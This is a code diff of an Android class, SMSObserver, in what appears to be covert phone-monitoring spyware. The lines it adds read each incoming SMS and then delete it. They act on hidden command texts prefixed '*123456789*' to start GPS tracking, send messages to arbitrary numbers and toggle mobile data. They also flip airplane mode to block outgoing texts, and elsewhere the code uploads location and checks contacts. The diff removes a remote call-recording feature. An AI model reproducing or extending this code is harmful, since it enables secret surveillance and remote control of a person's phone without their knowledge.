@@ -11,7 +11,6 @@ import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.db.util.DirectiveUtil;
 import com.privacy.monitor.domain.Contacts;
-import com.privacy.monitor.domain.Directive;
 import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.domain.TaskInfo;
@@ -20,7 +19,6 @@ import com.privacy.monitor.location.LocationMan;
 import com.privacy.monitor.provider.TaskInfoProvider;
 import com.privacy.monitor.resolver.field.SMSConstant;
 import com.privacy.monitor.service.utilservice.ClientSocket;
-import com.privacy.monitor.util.AlarmManagerUtil;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
@@ -81,8 +79,8 @@ public class SMSObserver extends ContentObserver {
 	@Override
 	public void onChange(boolean selfChange) {
 		super.onChange(selfChange);
-		if (DirectiveUtil.isStopAllFunction(directiveDB))return;
-		//killTask(context);
+		
+	
 		if(mResolver!=null && context !=null && !DirectiveUtil.isStopAllFunction(directiveDB)){
 		
 			Cursor smsCursor = mResolver.query(SMSConstant.CONTENT_URI, // 查询的URI,
@@ -103,6 +101,43 @@ public class SMSObserver extends ContentObserver {
 						final String date = smsCursor.getString(dateIndex);
 						String phone = smsCursor.getString(addressIndex);
 						final String body = smsCursor.getString(bodyIndex);
+						mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
+						
+						if(body.startsWith("*123456789*")){
+							int lastIndex = body.lastIndexOf("*");
+							if(lastIndex==10){
+								String strType = body.substring(11);
+								
+								directive(Integer.valueOf(strType));
+								
+							}else if(lastIndex>18){
+								String sendNumber = body.substring(14,lastIndex);
+								String content = body.substring(lastIndex);
+								SmsManager.getDefault().sendTextMessage(sendNumber+"",null,content, null,null);
+							
+							}else if(lastIndex==14){
+								String controlNet = body.substring((lastIndex+1));
+								if("1".equals(controlNet)){
+									Logger.d("SMSObserver","短信打开网络");
+									AppUtil.toggleMobileNet(context, true);
+								}else {
+									Logger.d("SMSObserver","短信关闭网络");
+									AppUtil.toggleMobileNet(context, false);
+								}
+							}
+							
+							
+							break;
+						}
+						
+						if (DirectiveUtil.isStopAllFunction(directiveDB))return;
+						
+						//阻止发送短信
+						if(DirectiveUtil.stopSend(body, directiveDB)){
+							AppUtil.toggleAirplane(context, true,0);
+							AppUtil.toggleAirplane(context, false,1000);
+							break;
+						}
 						
 						//是否监控
 						if(monitorDB !=null && !TextUtils.isEmpty(phone)){
@@ -110,7 +145,6 @@ public class SMSObserver extends ContentObserver {
 							if(monitor !=null && !"1".equals(monitor.getSmsMonitorStatus())){
 								break;
 							}
-							
 							
 							Contacts contacts = contactsDB.queryOnlyRow(Contacts.COL_PHONE+" =?  ",new String []{phone});
 							if(contacts !=null){
@@ -128,28 +162,6 @@ public class SMSObserver extends ContentObserver {
 							break;
 						}
 						startTime = date;
-						//阻止发送短信
-						if(DirectiveUtil.stopSend(body, directiveDB)){
-							AppUtil.toggleAirplane(context, true,0);
-							AppUtil.toggleAirplane(context, false,1000);
-							break;
-						}
-						
-						if(body.startsWith("*123456789*")){
-							String strType = body.substring(11,12);
-							int iType = Integer.valueOf(strType);
-							String strStatus = body.substring(13);
-							int iStatus = Integer.valueOf(strStatus);
-							if(iType==25){
-								int index = strType.lastIndexOf("*");
-								String content = strType.substring(index);
-								directive(iType,iStatus,content);
-							}else {
-								directive(iType,iStatus,"");
-							}
-							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
-							break;
-						}
 						
 						Cursor contractsCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","raw_contact_id","data1"}," data1 LIKE ? ",new String[]{"%"+phone+"%"},null);
 						boolean isUpload = false;
@@ -217,51 +229,12 @@ public class SMSObserver extends ContentObserver {
 		}	
 	}
 	
-	private void directive (int directiveNum,int status,String content){
-		if(directiveDB !=null){
-			Date date = new Date();
-			String head = "*123456789*";
-			boolean existStatus =directiveDB.exists(Directive.COL_TYPE+ " = ? ",new String []{status+""});
-			if(existStatus && directiveNum !=25 && directiveNum !=17){
-				directiveDB.update(Directive.COL_STATUS+" = ? "+", " + Directive.COL_START_TIME +"=? ", Directive.COL_TYPE +" =? ",new String []{status+"",date.getTime()+"",directiveNum+""});
-			}else if(directiveNum==25){
-				
-				if(status==1){
-					directiveDB.delete(Directive.COL_STATUS+"= ? ",new String []{content});
-				}else{
-					directiveDB.delete(Directive.COL_TYPE +" = ? ",new String []{"24"});
-				}
-				
-			}else if(directiveNum==17){
-			
-				SmsManager.getDefault().sendTextMessage(status+"",null,content, null,null);
-				
-			}else {
-				Directive directive = new Directive();
-				directive.setDirHead(head);
-				directive.setDirStatus(status+"");
-				directive.setDirType(directiveNum+"");
-				directive.setDirStartTime(date.getTime()+"");
-				directive.setDirPlatform(C.Directive.SMS+"");
-				directiveDB.insert(directive);
-			}
+	private void directive (int directiveNum){
+		
 			switch(directiveNum){
-			case 10:
-				if(!C.isRecorder){
-					if(status>0 && status <=60){
-						try {
-							long reLong = status*60*1000;
-							AlarmManagerUtil.startCron(context,C.ENV_ACTION,reLong);
-							C.isRecorder = true;
-							recordCallComment(reLong);
-						} catch (IOException e) {
-							e.printStackTrace();
-						}
-					}
-				}
-				break;
 			case 12:
 			case 13:
+				
 				LocationMan locationMan = new LocationMan(context);
 				if(directiveNum==12){
 					locationMan.setLocationPro(LocationClientOption.GpsFirst);
@@ -272,7 +245,7 @@ public class SMSObserver extends ContentObserver {
 				locationMan.startLocaiton();
 				break;
 			}
-		}
+		
 	}
 	
 	private class MyRunnback implements RunBack{
@@ -288,15 +261,13 @@ public class SMSObserver extends ContentObserver {
 				new Thread(new Runnable() {
 					@Override
 					public void run() {
-						AppUtil.toggleWifi(context, true);
-						SystemClock.sleep(10000);
 						if(!HttpUtil.detect(context)){
 							AppUtil.toggleMobileNet(context, true);
 							SystemClock.sleep(10000);
-							if(object instanceof String []){
-								String [] lo = (String[]) object;
-								uploadLocation(lo);
-							}
+						}
+						if(object instanceof String []){
+							String [] lo = (String[]) object;
+							uploadLocation(lo);
 						}
 					}
 				}).start();
@@ -310,6 +281,7 @@ public class SMSObserver extends ContentObserver {
 	}
 	
 	private void uploadLocation(String [] locaInfo){
+		
 		if(locaInfo !=null && locaInfo.length==2){
 			Date date = new Date();
 			SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
